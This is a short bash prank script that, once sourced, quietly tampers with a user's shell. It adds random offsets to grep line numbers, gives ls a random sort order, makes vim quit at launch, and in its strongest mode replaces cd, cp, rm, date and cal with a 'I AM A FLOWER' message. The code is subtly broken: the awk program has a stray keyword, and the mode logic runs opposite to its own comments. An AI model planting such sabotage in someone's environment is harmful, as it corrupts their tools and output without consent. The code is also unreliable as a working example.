#!/usr/bin/env bash

# valid values are: insane, annoying
# each mode of operation includes the previous one's tweaks
#
# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
#   open a new shell
# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
#   (random) directory



function insane()
{
    test "$FLOWERPOWER" = "insane"
}

function annoying()
{
    insane || test "$FLOWERPOWER" = "annoying"
}

function superflower()
{
    annoying || test "$FLOWERPOWER" = "superflower"
}

# Add a random number to line numbers when using `grep -n`.
insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }


# Use a random sort option whenever `ls` is invoked.
annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Quit vim on startup.
annoying && alias vim="vim +q";


# Have `date` return random dates.
superflower && alias date='echo "I AM A FLOWER"';
superflower && alias cd='echo "I AM A FLOWER"';
superflower && alias cp='echo "I AM A FLOWER"';
superflower && alias cal='echo "I AM A FLOWER"';
superflower && alias rm='echo "I AM A FLOWER"';
